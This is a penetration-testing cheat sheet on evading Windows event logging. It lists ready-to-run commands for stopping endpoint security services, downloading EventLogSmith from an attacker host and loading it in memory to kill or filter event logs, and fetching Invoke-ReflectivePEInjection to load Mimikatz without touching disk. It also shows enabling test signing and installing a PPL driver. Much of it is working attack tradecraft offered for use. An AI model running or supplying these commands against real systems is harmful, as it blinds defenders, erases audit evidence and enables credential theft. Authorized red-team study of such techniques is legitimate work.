# Windows Logging Evasion Techniques

This document contains commands and techniques for evading or manipulating
Windows event logs during penetration tests.

---

## 1. Security Services Management

### Stop/Start Security Monitoring Services

```bash
# Stop and restart Elastic Agent service
sc stop "Elastic Agent"
sc start "Elastic Agent"

# For other common security services
# sc stop "Windows Defender Advanced Threat Protection Service"
# sc stop "Symantec Endpoint Protection"
# sc stop "CrowdStrike Falcon"
```

---

## 2. Event Log Manipulation with EventLogSmith

[EventLogSmith](https://github.com/FalconForceTeam/EventLogSmith) is a tool for
manipulating Windows event logs.

### Terminate Event Logging

```powershell
# Load EventLogSmith in memory and terminate event logging
$data = (New-Object System.Net.WebClient).DownloadData('http://192.168.44.185/EventLogSmith.exe');
$assem = [System.Reflection.Assembly]::Load($data);
[EventLogSmith.EventLogSmith]::Main("-m terminate".Split())
```

### Restore Modified Event Logs

```powershell
# Restore PowerShell operational logs with 2 events
[EventLogSmith.EventLogSmith]::Main('-m restore -l Microsoft-Windows-PowerShell%4Operational.evtx -c 2'.Split())
```

### Filter Events by Interval

```powershell
# Filter PowerShell logs by interval and location
$data = (New-Object System.Net.WebClient).DownloadData('http://192.168.45.185/EventLogSmith.exe');
$assem = [System.Reflection.Assembly]::Load($data);
[EventLogSmith.EventLogSmith]::Main('-m filterinterval -c 10 -l Microsoft-Windows-PowerShell%4Operational.evtx,Windows^^^PowerShell.evtx -f C:\Windows\Tasks\'.Split())
```

---

## 3. In-Memory Tool Execution

### Load Mimikatz without Touching Disk

```powershell
# Download reflective PE injection script and use it to load Mimikatz in memory
IEX(New-Object System.Net.WebClient).DownloadString("http://192.168.45.185/Invoke-ReflectivePEInjection.ps1");
$bytes = (New-Object System.Net.WebClient).DownloadData('http://192.168.44.185/mimikatz.exe');
Invoke-ReflectivePEInjection -PEBytes $bytes
```

---

## 4. Kernel-Level Evasion Techniques

### Using Protected Process Light (PPL) for Evasion

Tools used:

- [PPL_Runner](https://github.com/pathtofile/PPLRunner) - Run processes with
  Protected Process Light protection
- [Sealighter](https://github.com/pathtofile/Sealighter) - ETW monitoring tool

```bash
# Enable test signing mode (required for unsigned drivers)
bcdedit /set testsigning on

# Install PPL_Runner driver
ppl_runner.exe install

# Configure Sealighter to run with PPL protection
REG.exe ADD HKLM\SOFTWARE\PPL_RUNNER /ve /t REG_SZ /d "C:\sealighter.exe --argument 1"

# Start the PPL Runner service
net start ppl_runner
```

### Monitoring Process Events with Sealighter

```powershell
# Parse Sealighter events to monitor specific process
$events = Get-WinEvent -LogName "Sealighter/Operational"
$pid=9780  # Target process ID to monitor
foreach ($event in $events) 
{
    $a = $event.properties[0].value | ConvertFrom-Json

    if(($a.properties.TargetProcessId -eq $pid))
    {
        $a.header.task_name
        $a.properties
    }
}
```
